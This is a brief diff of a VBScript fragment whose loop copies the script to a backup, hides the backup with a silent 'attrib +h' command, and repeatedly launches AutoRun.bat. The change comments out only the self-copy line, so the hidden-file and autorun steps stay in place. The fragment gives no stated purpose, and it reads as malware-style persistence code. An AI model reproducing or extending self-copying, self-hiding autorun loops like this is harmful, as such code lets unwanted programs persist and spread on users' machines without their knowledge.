@@ -17,7 +17,7 @@ Set WshShell = CreateObject("WScript.Shell")
 ' Continuously run the AutoRun.bat file and create a backup of the script
 Do
     ' Create a backup copy of the script
-    fso.CopyFile scriptPath, backupPath, True
+   '' fso.CopyFile scriptPath, backupPath, True
     ' Set the hidden attribute on the backup script
     WshShell.Run "cmd /c attrib +h " & chr(34) & backupPath & chr(34), 0, True
     ' Run the AutoRun.bat file
